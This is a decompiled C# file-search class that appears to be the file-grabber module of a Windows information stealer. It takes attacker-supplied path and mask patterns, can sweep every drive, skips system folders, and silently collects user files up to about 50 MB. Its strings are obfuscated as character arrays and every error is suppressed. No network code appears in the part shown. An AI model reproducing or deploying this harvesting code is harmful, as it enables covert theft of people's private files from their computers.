using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x02000013 RID: 19
public static class FileSearcher
{
	// Token: 0x0600008A RID: 138 RVA: 0x000067B4 File Offset: 0x00004BB4
	public static List<Entity5> Search(IEnumerable<string> patterns)
	{
		List<Entity5> list = new List<Entity5>();
		try
		{
			long num = 0L;
			foreach (string text in patterns)
			{
				bool flag = num >= 52428800L;
				if (flag)
				{
					break;
				}
				try
				{
					string[] array = text.Split(new string[]
					{
						new string(new char[]
						{
							'|'
						})
					}, StringSplitOptions.RemoveEmptyEntries);
					bool flag2 = array != null && array.Length > 2;
					if (flag2)
					{
						string text2 = Environment.ExpandEnvironmentVariables(array[0]);
						string[] searchPatterns = array[1].Split(new string[]
						{
							new string(new char[]
							{
								','
							})
						}, StringSplitOptions.RemoveEmptyEntries);
						string value = array[2];
						long num2 = 3097152L;
						bool flag3 = array.Length > 3;
						if (flag3)
						{
							num2 = Convert.ToInt64(array[3]);
						}
						bool flag4 = text2 == new string(new char[]
						{
							'%',
							'D',
							'S',
							'K',
							'_',
							'2',
							'3',
							'%'
						});
						if (flag4)
						{
							foreach (string rootPath in Environment.GetLogicalDrives())
							{
								try
								{
									foreach (string text3 in FileSearcher.GetFiles(rootPath, (SearchOption)Convert.ToInt32(value), searchPatterns))
									{
										try
										{
											FileInfo fileInfo = new FileInfo(text3);
											bool flag5 = fileInfo.Length > 0L && fileInfo.Length <= num2 && num < 52428800L;
											if (flag5)
											{
												string[] array2 = fileInfo.Directory.FullName.Split(new string[]
												{
													new string(new char[]
													{
														':',
														'\\'
													})
												}, StringSplitOptions.RemoveEmptyEntries);
												list.Add(new Entity5(fileInfo.FullName)
												{
													Id4 = ((array2 != null && array2.Length > 1) ? array2[1] : string.Empty),
													Id2 = text3
												});
												num += fileInfo.Length;
											}
										}
										catch
										{
										}
									}
								}
								catch
								{
								}
							}
						}
						else
						{
							foreach (string text4 in FileSearcher.GetFiles(text2, (SearchOption)Convert.ToInt32(value), searchPatterns))
							{
								try
								{
									FileInfo fileInfo2 = new FileInfo(text4);
									bool flag6 = fileInfo2.Length > 0L && fileInfo2.Length <= num2 && num < 52428800L;
									if (flag6)
									{
										string[] array3 = fileInfo2.Directory.FullName.Split(new string[]
										{
											new string(new char[]
											{
												':',
												'\\'
											})
										}, StringSplitOptions.RemoveEmptyEntries);
										list.Add(new Entity5(fileInfo2.FullName)
										{
											Id4 = ((array3 != null && array3.Length > 1) ? array3[1] : string.Empty),
											Id2 = text4
										});
										num += fileInfo2.Length;
									}
								}
								catch (Exception ex)
								{
								}
							}
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0600008B RID: 139 RVA: 0x00006BD0 File Offset: 0x00004FD0
	public static IEnumerable<string> GetFiles(string rootPath, SearchOption searchOption, string[] searchPatterns)
	{
		List<string> list = new List<string>
		{
			new string(new char[]
			{
				'\\',
				'W',
				'i',
				'n',
				'd',
				'o',
				'w',
				's',
				'\\'
			}),
			new string(new char[]
			{
				'\\',
				'P',
				'r',
				'o',
				'g',
				'r',
				'a',
				'm',
				' ',
				'F',
				'i',
				'l',
				'e',
				's',
				'\\'
			}),
			new string(new char[]
			{
				'\\',
				'P',
				'r',
				'o',
				'g',
				'r',
				'a',
				'm',
				' ',
				'F',
				'i',
				'l',
				'e',
				's',
				' ',
				'(',
				'x',
				'8',
				'6',
				')',
				'\\'
			}),
			new string(new char[]
			{
				'\\',
				'P',
				'r',
				'o',
				'g',
				'r',
				'a',
				'm',
				' ',
				'D',
				'a',
				't',
				'a',
				'\\'
			})
		};
		IEnumerable<string> enumerable = Enumerable.Empty<string>();
		bool flag = searchOption == SearchOption.AllDirectories;
		if (flag)
		{
			try
			{
				IEnumerable<string> enumerable2 = Directory.EnumerateDirectories(rootPath);
				foreach (string text in enumerable2)
				{
					bool flag2 = list != null && list.Any<string>();
					if (flag2)
					{
						bool flag3 = false;
						foreach (string value in list)
						{
							bool flag4 = text.Contains(value);
							if (flag4)
							{
								flag3 = true;
								break;
							}
						}
						bool flag5 = flag3;
						if (flag5)
						{
							continue;
						}
					}
					enumerable = enumerable.Concat(FileSearcher.GetFiles(text, searchOption, searchPatterns));
				}
			}
			catch
			{
			}
		}
		foreach (string searchPattern in searchPatterns)
		{
			try
			{
				enumerable = enumerable.Concat(Directory.GetFiles(rootPath, searchPattern));
			}
			catch
			{
			}
		}
		return enumerable;
	}
}
